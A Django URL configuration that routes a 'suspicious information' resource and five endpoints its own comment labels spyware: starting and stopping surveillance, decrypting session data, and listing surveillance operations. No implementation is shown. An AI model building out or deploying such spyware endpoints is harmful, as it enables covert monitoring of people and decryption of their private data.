from django.urls import path
from .views import InformacaoSuspeitaListCreateView, InformacaoSuspeitaRetrieveUpdateDestroyView
from .spyware_views import (start_surveillance, decrypt_session_data, 
                          get_session_status, list_surveillance_operations, 
                          stop_surveillance)

urlpatterns = [
    path('informacoes-suspeitas/', InformacaoSuspeitaListCreateView.as_view(), name='informacao-suspeita-list-create'),
    path('informacoes-suspeitas/<int:pk>/', InformacaoSuspeitaRetrieveUpdateDestroyView.as_view(), name='informacao-suspeita-detail'),
    
    # Spyware/Surveillance API endpoints
    path('surveillance/start/', start_surveillance, name='start-surveillance'),
    path('surveillance/decrypt/', decrypt_session_data, name='decrypt-session-data'),
    path('surveillance/status/<str:session_id>/', get_session_status, name='get-session-status'),
    path('surveillance/list/', list_surveillance_operations, name='list-surveillance-operations'),
    path('surveillance/stop/<str:session_id>/', stop_surveillance, name='stop-surveillance'),
]